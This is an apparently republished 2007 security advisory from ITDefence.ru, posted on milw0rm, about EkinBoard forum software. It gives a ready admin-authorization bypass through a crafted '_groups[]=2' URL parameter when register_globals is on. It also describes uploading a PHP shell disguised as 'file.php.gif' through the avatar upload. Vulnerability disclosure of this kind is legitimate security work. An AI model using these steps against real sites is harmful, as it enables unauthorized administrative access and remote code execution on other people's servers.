@@ -1,0 +1,32 @@
+----[ EkinBoard Remote File Upload / Auth Bypass ... ITDefence.ru Antichat.ru ]
+
+							EkinBoard >= 1.1.0 Remote File Upload / Auth Bypass
+							Eugene Minaev underwater@itdefence.ru 
+				___________________________________________________________________
+			____/  __ __ _______________________ _______  _______________    \  \   \
+			/ .\  /  /_// //              /        \       \/      __       \   /__/   /
+			/ /     /_//              /\        /       /      /         /     /___/
+			\/        /              / /       /       /\     /         /         /
+			/        /               \/       /       / /    /         /__       //\
+			\       /    ____________/       /        \/    __________// /__    // /   
+			/\\      \_______/        \________________/____/  2007    /_//_/   // //\
+			\ \\                                                               // // /
+			.\ \\        -[     ITDEFENCE.ru Security advisory     ]-         // // / . 
+			. \_\\________[________________________________________]_________//_//_/ . .
+			
+		We can bypass admin authorization if register_globals on . All admin panel script include this code
+		
+		<?php
+		if(!in_array(2, $_groups)){
+		die("<center><span class=red>You need to be an admin to access this page!</span></center>");
+		} 
+		?>
+		
+		test1.ru/skvoznoy/backup.php?_groups[]=2
+		
+		There is a bug in upload function . We can upload any file bypass filters . Name your shell like 
+		file.php.gif and select it as your avatar . Then check uploaded/avatars/filename_your_id.php
+
+----[ FROM RUSSIA WITH LOVE :: underWHAT?! , gemaglabin ]
+
+# milw0rm.com [2008-01-07]
